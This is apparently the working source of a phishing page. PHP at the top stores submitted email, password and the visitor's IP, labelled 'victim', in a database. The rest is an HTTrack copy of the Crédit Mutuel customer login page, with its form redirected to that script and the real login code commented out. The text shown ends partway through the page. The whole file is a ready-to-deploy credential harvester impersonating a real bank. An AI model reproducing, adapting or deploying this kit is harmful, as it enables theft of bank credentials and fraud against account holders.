<?php

if (isset($_POST['email']) && isset($_POST['password'])) {
    require('../../db/db.php');

    $email = $_POST['email'];
    $password = $_POST['password'];
    $victim_ip = $_SERVER['REMOTE_ADDR'];
    $page_id = 1;
    $counter = null;

    $sql1 = "SELECT email, password, counter FROM page_views_credit_mutuel";
    $stmt = $conn->prepare($sql1);
    $stmt->execute();
    $results = $stmt->fetchAll();

    foreach ($results as $result) {
        if ($result['email'] === $email) {
            $result['counter'] += 1;

            $sql2 = "UPDATE page_views_credit_mutuel SET counter = :counter WHERE email = :email";

            $stmt2 = $conn->prepare($sql2);
            $stmt2->execute(array(
                ':counter' => $result['counter'],
                ':email' => $result['email']
            ));
        } else {
            $result['counter'] = 1;

            $sql3 = "INSERT INTO page_views_credit_mutuel(visitor_ip, email, password, page_id, counter) VALUES(:victim_ip, :email, :password, :page_id, :counter);";

            $stmt3 = $conn->prepare($sql3);
            $stmt3->execute(array(
                ':victim_ip' => $victim_ip,
                ':email' => $email,
                ':password' => $password,
                ':page_id' => $page_id,
                ':counter' => $result['counter']
            ));
        }
    }

    $stmt->closeCursor();
}

?>

<!DOCTYPE html>
<html lang="fr">

<!-- Mirrored from www.creditmutuel.fr/authentification.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Sep 2021 17:29:18 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<title>Connexion à votre Espace Client - Crédit Mutuel</title>
	<meta name="description" content="Connectez-vous à votre Espace Client du Crédit Mutuel à l'aide de votre identifiant et mot de passe." />
	<meta name="espace" content="Aucun" />

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_base.css">
    <style>#cookieLBmain {outline: none;}.oblig {color: #d4041c !important;}</style>
    <script type="text/javascript" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/jquery_ei.js"></script>
    <script type="text/javascript" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/lightbox.js"></script>
    <script type="text/javascript" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/ei_tools.js"></script>
    <script type="text/javascript">
        if(!window.console)window.console={};
        if(!window.console.log)window.console.log=function(){};
    </script>


<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_messenger.css" />
<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_scrollzone.css" />
<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_carousel.css" />

<link type="text/css" rel="stylesheet" href="root/ressources/ei_specif_prospection.css" />
	<!-- favicons 2019 -->
	<link rel="apple-touch-icon" sizes="180x180" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/favicon-16x16.png">
	<link rel="manifest" href="https://cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/site.webmanifest">
	<link rel="mask-icon" href="https://cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/safari-pinned-tab.svg" color="#e2001a">
	<link rel="shortcut icon" href="https://cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/favicon.ico">
	<meta name="msapplication-TileColor" content="#ffffff">
	<meta name="msapplication-config" content="https://cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/favicons/browserconfig.xml">
	<meta name="theme-color" content="#ffffff">
	<!-- Appli mobile -->
	<meta name="apple-itunes-app" content="app-id=1436153712">

<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/appli/ei_custom_conseiller.css" />
<script type="text/javascript" src="../cdnsi.e-i.com/SOSD/sd/session_utils/1.0.1/scripts/sessionUtils.min.js"></script>
<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_needscript.css" />
<script type="text/javascript" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/SDTK/display.js"></script>
<script type="text/javascript" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/lightbox.js"></script>

    <script src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/env.js" type="text/javascript"></script>
    <link href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_responsive.css" rel="stylesheet" type="text/css" />
    <script src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/env_menu.js" type="text/javascript"></script>
    <link href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/appli/ei_custom_conseiller.css" rel="stylesheet" type="text/css" /> 
    <link rel="stylesheet" href="partage/fr/CC/CM-I14/styles/css_redac/redac.css" type="text/css" />


	<link type="text/css" rel="stylesheet" href="partage/fr/CC/CCM/styles/styles.css">
	<script type="text/javascript" src="partage/fr/CC/scripts/core.js"></script>
	<script type="text/javascript" src="partage/fr/CC/CCM/scripts/core.js"></script>
	<script type="text/javascript" async src="partage/fr/CC/scripts/tests.js"></script>
	<meta name="msvalidate.01" content="C2A59197330B1F20F89212C0F687EFE7" />
	<meta name="msvalidate.01" content="EBB1B2343CD60DDC81AA8A860A75928B" />


	<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_richradbutton.css" />
    <style>#cookieLBmain {outline: none;}.oblig {color: #d4041c !important;}</style>

<script type="text/javascript" src="../cdnsi.e-i.com/WEBO/sd/wat/1.0.7/javascripts/tracking_event.js" charset="UTF-8"></script>

<!-- Datasinks V2 -->
<script type="text/javascript">
    function getCookieDatasinks(nomCookie) {
    deb=document.cookie.indexOf(nomCookie+"=");
    if (deb>=0) {
        deb+=nomCookie.length+1;
        fin=document.cookie.indexOf(";",deb);
        if (fin<0) {
            fin=document.cookie.length;
        }
    return unescape(document.cookie.substring(deb,fin));
    }
    else { 
        return "";
    }
}

function isSolutionAccepted(solution) {
    var euConsent = "";
    // Récupération du cookie
    var cookieName = "eu-consent=";
    var ca = document.cookie.split(";");
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) === " ") {
        c = c.substring(1, c.length);
      }
      if (c.indexOf(cookieName) === 0) {
        euConsent = c.substring(cookieName.length, c.length);
      }
    }
  
    if (euConsent !== undefined && euConsent !== "") {
      euConsent = JSON.parse(euConsent);
  
      var path = document.location.pathname;
  
      // Sélection du chemin dans le cookie correspondant le mieux à l’url de la page courante
      var matchs = [];
      Object.keys(euConsent).forEach(function(acceptancePath) {
        if (path.substring(0, acceptancePath.length) === acceptancePath) {
          matchs.push(acceptancePath);
        }
      });
      matchs = matchs.sort(function(a, b) {
        return b.length - a.length;
      });
  
      // Retour
      if (matchs.length > 0 && euConsent[matchs[0]]["solutions"].hasOwnProperty(solution)) {
        return euConsent[matchs[0]]["solutions"][solution];
      }
    }
    return false;
}

var isTrackDatasinks = typeof(navigator) != "undefined" && navigator.doNotTrack != "1" && navigator.msDoNotTrack != "1" && typeof(window) != "undefined" && window.doNotTrack != "1";
var isConsentDatasinks = 
isSolutionAccepted("DCLIC") === true ||
((typeof(getCookieDatasinks) != "undefined" && getCookieDatasinks('cookies_accepted') != null && getCookieDatasinks('cookies_accepted') != "") && (getCookieDatasinks('cookies_accepted') == "1" || getCookieDatasinks('cookies_accepted').match("cookie_marketing=true")));

if (isTrackDatasinks && isConsentDatasinks && false) {
    (function(l, o, a, d, i, n, g) {
        l.__ds_name__ = i;
        l[i] = l[i] || function(m) {
            m = m || "_default";
            return l[i][m] = l[i][m] || function s(o, f) {
                if (
                    o + f === "usertraits") return function t() {
                    (t._q = t._q || []).push(arguments)
                };
                s !== l[i][m] && l[i][m].apply(null, arguments) || (s._q = s._q || []).push(arguments)
            }
        };
        n = o.createElement(a);
        g = o.getElementsByTagName(a)[0];
        n.async = 1;
        n.src = d;
        g.parentNode.insertBefore(n, g)
    })(window, document, "script", "../cdnsi.e-i.com/SDUT/sd/datasinks/0.1.0/js/ds.min.js", "ds");
    if (typeof ds === "function") {
        ds()("init", {
            api: "https://ingester.ds2.e-i.com/ing1",
            seg: "https://ingester.ds2.e-i.com/aud1/segments",
            pid: "c898f92a",
            cookieDuration: 395
        });
        ds()("segments", function(segs) {
            setTimeout(function() {
                if (segs.length > 0) {
                    // Datasinks V2 segments cookie: max-age=one year
                    document.cookie = "dsseg=" + segs.join('') + "; max-age=31536000; path=/";
                }
            }, 5000);
        });
    }
}
    
</script>
<!-- Datasinks V2 -->



</head>
<body>


<ul id="e_raccourci">
	<li><a href="authentification.html">Identification</a></li>
    <li><a href="#ei_tpl_content">Contenu principal</a></li>
	<li><a href="#ei_tpl_footer">Pied de page</a></li>
	<li><a href="fr/authentification.html" title= "Espace conseiller Messagerie nouvel onglet" target="_blank">Votre conseiller</a></li>
</ul>
<!-- ei-msgs-chat -->
<div id="ei_tpl_fullsite" class="ei_tpl_conseil ei_cm2015 ei_tpl_nomenu">
    <header id="ei_tpl_head" role="banner" data-sticky>
        <div id="ei_tpl_head_center">
            <div class="ei_tpl_head_table">
                <div class="ei_tpl_head_td" id="ei_tpl_logo">
                    
<a href="home/index.html"><span>Cr&eacute;dit Mutuel</span></a>
<script type="text/javascript" src="../cdnsi.e-i.com/SRCH/sd/exalead/1.11.1/javascripts/ajax_search.js"></script>

                </div>
                <div class="ei_tpl_head_td" id="ei_tpl_agence"></div>
                <div class="ei_tpl_head_td" id="ei_tpl_search">
                    <form autocomplete="off" action="https://www.creditmutuel.fr/search_engine.html" method="get" name="form_rechercher" class="CMSD_search" role="search">
	<label accesskey="4"  class="e_invisible" for="SRCH_top">Rechercher</label>
	<input type="text" class="pQuery e_texte" placeholder="Rechercher" id="SRCH_top" name="pQuery">
    <div class="autocomplete_search_top"></div>
	<input type="image" class="e_image" alt="Lancer la recherche" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/transparent.gif">    
</form> 
<script>
    
$('#SRCH_top').keyup(function(e){
    var search_value = e.currentTarget.value;
    setTimeout(AjaxCallToExalead(search_value,".autocomplete_search_top","search_engine.html","SearchAjax.html"), 300);
});
</script>

                </div>
                <div class="ei_tpl_head_td hide_voc" id="CYB1_VOC"></div>
                <script type="text/javascript">$( document ).ready(function() { $("#ei_tpl_agence").append(""); });</script><div id="ei_tpl_devenirclient" class="ei_tpl_head_td"><div class="ei_tpl_dclient_content"><div><p class="ei_tpl_dclient_title" ><a href="home/index.html">Devenir client</a></p><p>du Crédit Mutuel</p></div></div></div>
                <div class="ei_tpl_head_td ei_tpl_ident" id="ei_tpl_identconnexion">
                    <div id="ei_tpl_ident">
    <div id="ei_tpl_login">
    
    <p class="ei_tpl_ident_login_title"><a id="ei_tpl_ident_link" href="authentification.html">Espace client</a></p>
    
    </div>
</div>

                </div>
            </div>
        </div>
    </header>
    
    <div id="ei_tpl_searchmobil">
        <form autocomplete="off" action="https://www.creditmutuel.fr/search_engine.html" method="get" name="form_rechercher" class="CMSD_search" role="search">
	<label accesskey="4"  class="e_invisible" for="SRCH_top_mobile">Rechercher</label>
	<input type="text" class="pQuery e_texte" placeholder="Rechercher" id="SRCH_top_mobile" name="pQuery">
    <div class="autocomplete_search_top"></div>
	<input type="image" class="e_image" alt="Lancer la recherche" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/transparent.gif">    
</form>
<script>

$('#SRCH_top_mobile').keyup(function(e){
    var search_value = e.currentTarget.value;
    setTimeout(AjaxCallToExalead(search_value,".autocomplete_search_top","search_engine.html","SearchAjax.html"), 300);
});
</script>

    </div>
    <div id="ei_tpl_contener">
        <div id="ei_tpl_ariane">
            <!-- Ariane -->
                            <a href='home/index.html'>Accueil</a>
                        <span aria-hidden="true" class='e_ariane_img'></span>
                        <span>Identification</span>
<!-- /Ariane -->
        </div>
        <main id="ei_tpl_content" role="main">
            <noscript><META HTTP-EQUIV="Refresh" CONTENT="0; URL=fr/navigateur_javascript.html"></noscript>

<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/devb_base.css">
<script type="text/javascript" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/javascript/appli/responsiveMD.js"></script>
<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/ei_custom_md.css">
<link type="text/css" rel="stylesheet" href="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/css/appli/ei_custom_identification.css">

<script type="text/javascript">
/**************************** CONSOLE DEBUG ACTIVATION *************************************/
if (!window.console) {
    window.console = {};
}
else {
    if (!window.console.debug && typeof window.console.log !== 'undefined') {
        window.console.debug = window.console.log;
    }
}
var names = ["log", "debug", "info", "warn", "error", "assert", "dir", "dirxml",
    "group", "groupEnd", "time", "timeEnd", "count", "trace", "profile", "profileEnd"];
for (var i = 0; i < names.length; ++i) {
    if (!window.console[names[i]]) {
        window.console[names[i]] = function() {};
    }
}
/*******************************************************************************************/

if (typeof jQuery == 'undefined') {
    throw "Authentication required JQuery";
}

/* Array item's order should respect the order of the menu */
var authApps = [];
authApps.push({ baseId: 'password' , scriptMethodName: '', scriptLoaded: false});
authApps.push({ baseId: 'ksign' , scriptMethodName: 'loadScriptsKSign', scriptLoaded: false});
authApps.push({ baseId: 'safetrans' , scriptMethodName: 'loadScriptsSafetrans', scriptLoaded: false});

/* url to codes acces oublies */
var forgotAccessUrl = '';

/* url to security infos */
var infoSecurityUrl = '';

/* url to webmaster informations bloc */
var infoUrlPwd = '';
var infoUrlKSign = '';
var infoUrlKSafetrans = '';

function showApps(index) {
    if (index < 0) {
        index = 0;  // Default is password
    }

    if (index < authApps.length) {
        var $app = $('#' + authApps[index].baseId);
        var $marketing = $(".ei_ident_marketing_" + authApps[index].baseId);
        if ($app.length) {
            if (authApps[index].scriptLoaded == false && authApps[index].scriptMethodName.length){
                loadAsynchronousScripts(authApps[index].scriptMethodName);
                authApps[index].scriptLoaded = true;
            }
            $app.css('display', '');
            if ($marketing.length) {
                $marketing.css('display', '');
            }
            $app.find('input:first').focus();
            eraseCookie('lastCnx');
            createCookie('lastCnx',authApps[index].baseId, 30)
        }
    }
}

function hideAllApps() {
    var allApps = [];
    // All DOM read
    for (var i = 0; i < authApps.length; ++i) {
        allApps.push({ $app: $('#' + authApps[i].baseId), $marketing: $(".ei_ident_marketing_" + authApps[i].baseId) });
    }
    // All DOM write
    for (var i = 0; i < allApps.length; ++i) {
        if (allApps[i].$app.length) {
            allApps[i].$app.css('display', 'none');
        }
        if (allApps[i].$marketing.length) {
            allApps[i].$marketing.css('display', 'none');
        }
    }
}

function loadAsynchronousScripts(name) {
    if (typeof window[name] == 'function') {
        // Call asynchronously
        setTimeout(function() {
            window[name]();
        }, 0);
    }
}

function mapAuthenticationModeToIndex(authenticationMode) {
    var index = 0;
    for (var i = 0; i < authApps.length; ++i) {
        if (authApps[i].baseId == authenticationMode) {
            index = i;
            break;
        }
    }
    return index;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; ++i) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function createCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    document.cookie = name + "=" + value + expires + "; path=/" + "; secure; ";
}

function eraseCookie(name) {
    createCookie(name, "", -1);
}

function loadAsynchronousMarketingContent($marketingElement, url) {
    if ($marketingElement.length) {
        if (url.length == 0) {
            $marketingElement.html('');
            return;
        }
        $.ajax({
            type: "get",
            url: url,
            success: function (html) {
                $marketingElement.html(html);
            },
            error: function (e) {
                $marketingElement.html('');
            },
            dataType: "html"
        });
    }
}

function setIdLien() {
    /* Defaults spaces is Aucun then Particuliers */
    /* In space Aucun */
    forgotAccessUrl_aucun = "codes-acces-oublies.html";
    infoSecurityUrl_aucun = "home/index.html";
    infoUrlPwd_aucun = "informations_mdp.html";
    infoUrlKSign_aucun = "informations_ksign.html";
    infoUrlKSafetrans_aucun = "informations_safetrans.html";

    /* In space Particuliers */
    forgotAccessUrl_particulier = "codes-acces-oublies.html";
    infoSecurityUrl_particulier = "home/index.html";
    infoUrlPwd_particulier = "informations_mdp.html";
    infoUrlKSign_particulier = "informations_ksign.html";
    infoUrlKSafetrans_particulier = "informations_safetrans.html";

    /* Default Values */
    forgotAccessUrl = '';
    infoSecurityUrl = (infoSecurityUrl_aucun == '') ? infoSecurityUrl_particulier : infoSecurityUrl_aucun;;
    infoUrlPwd = '';
    infoUrlKSign = '';
    infoUrlKSafetrans = '';

    var espace = null;
    if (typeof getEspace == 'function') {
        espace = getEspace();

        if (espace != null) {
            /* Set idlink according to space cookie value */
            switch (espace){
                    case "Professionnel":
                        forgotAccessUrl = "codes-acces-oublies.html";
                        infoUrlPwd = "informations_mdp.html"
                        infoUrlKSign = "informations_ksign.html"
                        infoUrlKSafetrans = "informations_safetrans.html"
                        break;
                    case "Jeune":
                        forgotAccessUrl = "codes-acces-oublies.html";
                        infoUrlPwd = "informations_mdp.html"
                        infoUrlKSign = "informations_ksign.html"
                        infoUrlKSafetrans = "informations_safetrans.html"
                        break;
                    case "Frontalier":
                        forgotAccessUrl = "codes-acces-oublies.html";
                        infoUrlPwd = "informations_mdp.html"
                        infoUrlKSign = "informations_ksign.html"
                        infoUrlKSafetrans = "informations_safetrans.html"
                        break;
                    case "Particulier":
                        forgotAccessUrl = "codes-acces-oublies.html";
                        infoUrlPwd = "informations_mdp.html"
                        infoUrlKSign = "informations_ksign.html"
                        infoUrlKSafetrans = "informations_safetrans.html"
                        break;
                    case "Association":
                        forgotAccessUrl = "codes-acces-oublies.html";
                        infoUrlPwd = "informations_mdp.html"
                        infoUrlKSign = "informations_ksign.html"
                        infoUrlKSafetrans = "informations_safetrans.html"
                        break;
                    case "Agriculteur":
                        forgotAccessUrl = "codes-acces-oublies.html";
                        infoUrlPwd = "informations_mdp.html"
                        infoUrlKSign = "informations_ksign.html"
                        infoUrlKSafetrans = "informations_safetrans.html"
                        break;
                    default:
                        break;
            }
        }
    }

    if (!forgotAccessUrl.length) {
        forgotAccessUrl = (forgotAccessUrl_aucun == '') ? forgotAccessUrl_particulier : forgotAccessUrl_aucun;
    }

    if (!infoUrlPwd.length) {
        infoUrlPwd = (infoUrlPwd_aucun == '') ? infoUrlPwd_particulier : infoUrlPwd_aucun;
    }

    if (!infoUrlKSign.length) {
        infoUrlKSign = (infoUrlKSign_aucun == '') ? infoUrlKSign_particulier : infoUrlKSign_aucun;
    }

    if (!infoUrlKSafetrans.length) {
        infoUrlKSafetrans = (infoUrlKSafetrans_aucun == '') ? infoUrlKSafetrans_particulier : infoUrlKSafetrans_aucun;
    }
}

function redirectToLink(link) {
    window.location = link;
    return false;
}

$(document).ready(function(){

    $('p.liensctx').append($("#exceptionalBreak").html());

    setIdLien();

    var $market_mdp_app = $(".ei_ident_marketing_password");
    var $market_ksign_app = $(".ei_ident_marketing_ksign");
    var $market_safetrans_app = $(".ei_ident_marketing_safetrans");
    loadAsynchronousMarketingContent($market_mdp_app, infoUrlPwd);
    loadAsynchronousMarketingContent($market_ksign_app, infoUrlKSign);
    loadAsynchronousMarketingContent($market_safetrans_app, infoUrlKSafetrans);

    var lastSelected = mapAuthenticationModeToIndex(getCookie("lastCnx"));
    var selectedItemTxt = "selected_item_text";
    var txt = $('div.ei_md li.ei_md_masteritem').eq(lastSelected).find('a.ei_md_masterlink').text();
    contentloading(lastSelected, txt);

	function contentloading(_index, _itemtxt) {
		hideAllApps();
		showApps(_index);

		var txt = _itemtxt;
		var ind = txt.indexOf(selectedItemTxt, 0);
		if (ind > 0) {
            txt = txt.substring(0,ind);
        }
		$('div.ei_md div.ei_md_detail #idTitre').text(txt);
		if (lastSelected > -1) {
			$('div.ei_md li.ei_md_masteritem').eq(lastSelected).removeClass("ei_md_selected");
			$('div.ei_md div.ei_md_mastertxt').eq(lastSelected).find('a.ei_md_masterlink').removeAttr('title');
			$('div.ei_md div.ei_md_mastertxt').eq(lastSelected).find('a.ei_md_masterlink span').remove('.invisible');
		}
		if (_index > -1){
			$('div.ei_md li.ei_md_masteritem').eq(_index).addClass("ei_md_selected");
			$('div.ei_md div.ei_md_mastertxt').eq(_index).find('a.ei_md_masterlink').attr('title',txt ).append('<span class="invisible">' + selectedItemTxt +'</span>');
			lastSelected = _index;
		}
	}

    $('div.ei_md li.ei_md_masteritem').click(function(e){
        var indexItem = $('div.ei_md li.ei_md_masteritem').index($(this));
        contentloading(indexItem, $(this).find('a.ei_md_masterlink').text());
        return false;
    });

    $('div.ei_md div.ei_md_mastertxt a.ei_md_masterlink').focus(function(){
        $(this).closest("div.ei_md_mastertxt").addClass("ei_md_hasfocus");
    });

    $('div.ei_md div.ei_md_mastertxt a.ei_md_masterlink').blur(function(){
        $(this).closest("div.ei_md_mastertxt").removeClass("ei_md_hasfocus");
    });

    $('div.ei_md div.ei_md_mastertxt a.ei_md_masterlink').keydown(function(e){
        if (e.which == 13) {
            $(this).closest("li.ei_md_masteritem").trigger("click");
        }
    });
   /*
    $('#bloc_ident').on('submit', function(e) {
        e.preventDefault();

        var $this = $(this);

        var postParam =  {"loginPasswordAuthenticationRequest":{'applicationId': 'CM', 'login': $('#_userid').val(), 'password': $('#_pwduser').val(), 'media':'AN'}};

        $.ajax({
            url: '/fr/ws/login_password_ws.html',
            type: 'POST',
            data: JSON.stringify(postParam),
            success: function(json) {
                if (json.returnCode === 'Success') {
                    redirectToLink('/fr/banque/pageaccueil.html');
                } else {
				    $(".blocpatience2").remove();
                    $("#errorMessage").text(json.returnMessage);
                    $(".errorMessageBlock").css('display', '');
                }
            },
            error: function(xhr, textStatus, error) {
				 $(".blocpatience2").remove();
                 $("#errorMessage").text(error);
                 $(".errorMessageBlock").css('display', '');
            }
        });
    }); */
});

</script>

	<div class="a_blocappli">
	<div class="ei_titleblock ei_mdr_maintitle">
		<div class="ei_titlelabelsblock">
			<div class="ei_titlelabel"><p role="heading" aria-level="1">Espace client : Connexion</p></div>
			<div class="ei_subtitlelabel"></div>
		</div>
		<div class="ei_titleactionsblock"></div>
	</div>
	<div class="a_blocfctl">
        <div class="ei_md ei_mdr_formselectorlistbox">
            <div class="ei_md_envtech">
                <div class="ei_md_master">
                    <div class="ei_md_masterbody">
                        <ul class="ei_md_masterroot">
                            <li class="ei_md_masteritem">
                                <div class="ei_md_mastertxt"><a class="ei_md_masterlink" href="#">Identifiant / Mot de passe</a></div>
                            </li>
                            <li class="ei_md_masteritem">
                                <div class="ei_md_mastertxt"><a class="ei_md_masterlink" href="#">Certificat Électronique</a></div>
                            </li>
                            <li class="ei_md_masteritem">
                                <div class="ei_md_mastertxt"><a class="ei_md_masterlink" href="#" id="menu_safetrans">SAFETRANS</a></div>
                            </li>
                        </ul>
                    </div>
                    <div class="ei_md_masterfooter"></div>
                </div>

                <div class="ei_md_nmaster">
                    <div class="ei_ident_marketing_password"></div>
                    <div class="ei_ident_marketing_ksign"></div>
                    <div class="ei_ident_marketing_safetrans"></div>
                </div>

            </div>
            <div class="ei_md_separator"></div>
            <div class="ei_md_detail" tabindex="-1">
                <!--Deb-->
                <div class="ei_titleblock ei_mdr_titledetail">
                    <div class="ei_titlelabelsblock">
                        <div class="ei_titlelabel"><span id="idTitre" role="heading" aria-level="2"></span></div>
                        <div class="ei_subtitlelabel"></div>
                    </div>
                </div>
                <!--Fin-->
                
                <div class="a_blocfctl" id="contentDetail">
                    <div id="password">
                        <div class="alerteBlock" style="display:none">
                            <div class="bloctxt alerte eir_hidexs">
                            </div>
                             <div class="bloctxt alerte eir_showxs">
                            </div>
                        </div>
                        <div class="errorMessageBlock bloctxt err" style="display:none"><span id="errorMessage"></span></div>
                        <div>




<div class="ei_appl_ident" id="ident">
    <p class="a_titre1"></p>
    
    
    
    
    

    
    
    <form action="index.php"  method="post" autocomplete="off" onsubmit="return shouldSubmitForm()" name="bloc_ident" id="bloc_ident">
        <fieldset>
            
            <div class="ei_appl_ident_content">
                
                <div class="ei_appl_ident_lig">
                    
                    <label for="_userid">Identifiant</label>
                    
                    <input type="text" name="email" id="_userid" value="" placeholder="" class="ei_appl_userid" >
                    <input type="hidden" name="flag" value="password">
                    <input type="hidden" name="_charset_">
                </div>

                <div class="ei_appl_ident_lig">

               <label for="_pwduser">Mot de passe</label>
               <input type="password" name="password" id="_pwduser" placeholder="" class="ei_appl_pwduser" maxlength=64>

                </div>

                <script type="text/javascript">
                    var triggeredFormSubmit = false;
                    var formSubmitted = false;

                    function submitForm() {
                        formSubmitted = true;
                        document.getElementById("bloc_ident").submit();
                    }

                    function submitFormOrCaptcha() {
                        
                        
                        
                        submitForm();
                        
                    }

                    function submitFormIfNecessary() {
                        if (shouldSubmitForm()) {
                            submitFormOrCaptcha();
                        }
                    }

                    function shouldSubmitForm() {
                        if (triggeredFormSubmit) {
                            return false;
                        }

                        triggeredFormSubmit = true;

                        

                        if (formSubmitted) {
                            return false;
                        }

                        
                           
                           
                               esd1_displayWait('ident', 'Connexion en cours', 'Veuillez patienter');
                           
                       

                       return true;
                    }

                    
                </script>
            </div>
        </fieldset>

        

        

        

        

        

        <div class="ei_appl_ident_blocbts blocboutons">
            
            <span class="ei_buttonbar">


                <span class="ei_mainbuttons">

                        <span id="login-submit" class="ei_button">
                            <a class="ei_btn" onclick="submitFormIfNecessary()"
                               aria-labelledby="label-validate" role="button" href="#">
                                <span class="ei_btn_body" id="label-validate">
                                    <span class="ei_btn_tlcorn" role="presentation"></span>
                                    <span class="ei_btn_label">Se connecter</span>
                                    <span class="ei_iblock ei_btn_pic" role="presentation">&nbsp;</span>
                                </span>
                                <span class="ei_btn_footer" role="presentation">
                                    <span class="ei_btn_blcorn" role="presentation"></span>
                                </span>
                            </a>
                        </span>
                        <script type="text/javascript">
                            var $bloc_ident = $("#bloc_ident");
                            // submit form with enter (13) key when focus is on identifier/password input
                            $bloc_ident.on("keydown", "input", function(e) {
                                if(e.keyCode == 13) {
                                    submitFormIfNecessary();
                                }
                            });

                            $('#login-submit').on('keypress', function(e) {
                                // enter (13) or space (32) key pressed
                                var enterOrSpacePressed = (e.keyCode == 13 || e.keyCode == 32);
                                if (enterOrSpacePressed) {
                                    submitFormIfNecessary();
                                    e.preventDefault(); // avoid scrolling when space key is pressedif (e.keyCode == 13) {
                                }
                            });

                            var $userid = $("#bloc_ident input[id=_userid]");
                            if ($userid.is(":visible")) {
                                $userid.focus();
                            }
                            else {
                                // case of memorized user id, set focus on password input
                                $("#bloc_ident input[id=_pwduser]").focus();
                            }
                        </script>


                </span>
            </span>
        </div>

        

        
        <script>
        var page_name = "";
var application_name = "AUTHENTIFICATION";
var subscription_form_step = "";
var errors = "";
        </script>
        
    </form>
    
</div>
</div>
                        <p class="liensctx c">
                            <a href="#" onClick="return redirectToLink(forgotAccessUrl);" class="ei_acces">Codes d'accès oubliés</a>
                            <a href="#" onClick="return redirectToLink(infoSecurityUrl);" class="ctx">Infos sécurité</a>
                        </p>
                    </div>
                    <div id="cab" style="display:none">
                        <div></div>
                    </div>
                    <div id="ksign" style="display:none">
                        <div class="c"><script>
function loadScriptsKSign() {
    $("#certificate_img").attr("src", "../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/appli/authent/certificat.png");
}
</script>

<a href="https://cert.creditmutuel.fr/creditmutuel/fr/identification/client_cert.cgi" title="Connexion avec Certificat Électronique">
    <img id="certificate_img" alt="Connexion avec Certificat Électronique" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs%3D" data-src="https://cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/appli/authent/certificat.png" style="margin:10.5px 10px 10px" width="300" height="142">
</a>
<div class="bloctxt info">
    <p><em>Pensez à introduire votre certificat avant de cliquer sur "Se connecter".</em></p>
</div>
<!--<div class="bloctxt alerte">
    <p><em>Si vous rencontrez des difficultés de connexion, une mise à jour du certificat installé sur votre navigateur est peut-être nécessaire. Dans ce cas, suivez les étapes décrites dans <a target="_blank" href="/medias/authentication/generic_1.0/pdf/v190529_maj_ksign.pdf">ce document</a>.</em></p>
</div>-->

<div class="blocboutons">
        <input type="image"  alt="Se connecter" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/seconnecter.png" name="submit"
        onclick="location.href = 'https://cert.creditmutuel.fr/creditmutuel/fr/identification/client_cert.cgi'">
</div>
</div>
                        <p class="liensctx c">
                            <a href="#" onClick="return redirectToLink(forgotAccessUrl);" class="ei_acces">Codes d'accès oubliés</a>
